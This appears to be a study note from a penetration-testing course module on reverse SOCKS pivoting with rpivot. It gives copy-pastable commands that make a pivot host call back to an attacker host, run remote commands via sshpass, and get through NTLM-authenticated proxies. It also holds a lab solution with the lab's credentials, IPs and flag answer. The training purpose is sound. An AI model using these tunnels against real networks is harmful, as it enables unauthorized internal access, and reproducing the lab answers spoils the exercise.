# 10 — Web Server Pivoting with Rpivot

> Rpivot is a reverse SOCKS proxy — the pivot calls OUT to the attack host, exposing a SOCKS port on the attack host that tunnels back through the pivot to the internal network.

---

## How It Works

```
Attack Host  [server.py — listens on :9999 for client, SOCKS on :9050]
    ▲  client connects back to attack host port 9999
    │
Ubuntu Pivot  [client.py — calls back to attack host]
    │  forwards SOCKS traffic into internal network
    ▼
172.16.5.135:80  (internal web server — unreachable directly)
```

Rpivot is **reverse** — the pivot initiates the connection out to the attack host. Useful when the pivot can reach you but you can't reach the pivot directly.

---

## Who Runs What — Key Rule

| Component | Runs on | Role |
|-----------|---------|------|
| `server.py` | **Attack Host** | Listens for client callback, exposes SOCKS proxy on `127.0.0.1:9050` |
| `client.py` | **Pivot Host** | Calls back to attack host, bridges SOCKS traffic into internal network |

> Q1 answer: `server.py` → **Attack Host**
> Q2 answer: `client.py` → **Pivot Host**

---

## Setup

**Install rpivot and Python 2.7 on attack host:**

```bash
git clone https://github.com/klsecservices/rpivot.git
sudo apt-get install python2.7
```

**Transfer rpivot to pivot host:**

```bash
scp -r rpivot ubuntu@PIVOT_IP:/home/ubuntu/
```

---

## Basic Usage

**Step 1 — Start server.py on attack host:**

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

- `--proxy-port 9050` — SOCKS proxy port on attack host (add to proxychains)
- `--server-port 9999` — port the pivot client calls back to
- `--server-ip 0.0.0.0` — listen on all interfaces

**Step 2 — Run client.py on pivot host:**

```bash
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
# Backconnecting to server 10.10.14.18 port 9999
```

Attack host confirms: `New connection from host 10.129.202.64, source port 35226`

**Step 3 — Configure proxychains (if not already set):**

```bash
# /etc/proxychains4.conf
socks4  127.0.0.1 9050
```

**Step 4 — Browse internal network through the tunnel:**

```bash
proxychains firefox-esr 172.16.5.135:80

# Or CLI
proxychains curl http://172.16.5.135:80
```

---

## NTLM Proxy Authentication

When the pivot is behind a corporate HTTP proxy requiring NTLM auth (common in AD environments):

```bash
python2.7 client.py \
  --server-ip ATTACK_HOST_IP \
  --server-port 8080 \
  --ntlm-proxy-ip PROXY_IP \
  --ntlm-proxy-port 8081 \
  --domain DOMAIN_NAME \
  --username USERNAME \
  --password PASSWORD
```

---

## Full Copy-Pastable Chain

**On attack host — clone, start server**

```bash
cd ~ && git clone https://github.com/klsecservices/rpivot.git
sudo apt-get install -y python2.7

LHOST=$(ip -br a | grep tun0 | awk '{print $3}' | cut -d/ -f1)
echo "[*] Starting rpivot server — LHOST=$LHOST"
python2.7 ~/rpivot/server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

**On attack host (separate terminal) — transfer rpivot to pivot**

```bash
sshpass -p 'HTB_@cademy_stdnt!' scp -o StrictHostKeyChecking=no \
  -r ~/rpivot ubuntu@PIVOT_IP:/home/ubuntu/
```

**On pivot host — run client**

```bash
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@PIVOT_IP \
  'python2.7 /home/ubuntu/rpivot/client.py --server-ip ATTACKER_IP --server-port 9999'
```

**Grab flag from internal web server**

```bash
proxychains curl -s http://172.16.5.135:80
```

---

## Triage

| Symptom | Fix |
|---------|-----|
| `python2.7: command not found` | `sudo apt-get install python2.7` or use pyenv |
| Client connects but SOCKS times out | Confirm `--proxy-port` matches proxychains config |
| `Connection refused` on server port | server.py not running or firewall blocking port 9999 |
| NTLM proxy blocking client callback | Use `--ntlm-proxy-*` flags with domain creds |
| `firefox-esr` hangs through proxychains | Try `proxychains curl` first to confirm tunnel works |

---

## Key Takeaways

1. **server.py = Attack Host. client.py = Pivot Host.** The pivot calls out — never the other way.
2. Rpivot is a **reverse** SOCKS proxy — useful when you can't reach the pivot directly but it can reach you.
3. After setup, proxychains workflow is identical to `ssh -D` — same `socks4 127.0.0.1:9050` config.
4. NTLM proxy support makes rpivot useful in heavily locked-down corporate environments where the pivot sits behind an authenticated proxy.
5. Requires Python 2.7 — older tool, but still relevant in restricted environments.

---

## Lab Solution — Section 10 Skills (May 8, 2026)

**Pivot IP:** `10.129.202.64` (ACADEMY-PIVOTING-LINUXPIV)
**Pivot creds:** `ubuntu : HTB_@cademy_stdnt!`
**Internal web server:** `172.16.5.135:80`
**Attack host tun0:** `10.10.17.176` (auto-detect with command below)

### Q1 — server.py runs on which host? → `Attack Host`
### Q2 — client.py runs on which host? → `Pivot Host`
### Q3 — Flag from internal web server → `I_L0v3_Pr0xy_Ch@ins`

**Verified full chain (all commands run on attack host):**

```bash
# Step 1 — Clone rpivot (python2.7 already installed on Kali)
cd ~ && git clone https://github.com/klsecservices/rpivot.git

# Step 2 — Transfer rpivot to pivot host
sshpass -p 'HTB_@cademy_stdnt!' scp -o StrictHostKeyChecking=no \
  -r ~/rpivot ubuntu@10.129.202.64:/home/ubuntu/

# Step 3 — Start rpivot server on attack host (background)
python2.7 ~/rpivot/server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0 &

# Step 4 — Run rpivot client on pivot host (connects back to attack host)
LHOST=$(ip -br a | grep tun0 | awk '{print $3}' | cut -d/ -f1)
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.202.64 \
  "python2.7 /home/ubuntu/rpivot/client.py --server-ip $LHOST --server-port 9999" &

# Step 5 — Wait ~5s for connection, then grab flag
sleep 5
proxychains -q curl -s http://172.16.5.135:80
# Flag is in the page title and section header: I_L0v3_Pr0xy_Ch@ins
```

**proxychains config** (`/etc/proxychains4.conf`) — already correct on Kali:
```
socks4  127.0.0.1 9050
```

**What the server outputs when pivot connects:**
```
New connection from host 10.129.202.64, source port <ephemeral>
```

**Flag:** `I_L0v3_Pr0xy_Ch@ins`

---

## References

- Previous: [09-SSH_Pivoting_with_Sshuttle.md](09-SSH_Pivoting_with_Sshuttle.md)
- Next: [11-Port_Forwarding_with_Windows_Netsh.md](11-Port_Forwarding_with_Windows_Netsh.md)
- Rpivot GitHub: https://github.com/klsecservices/rpivot
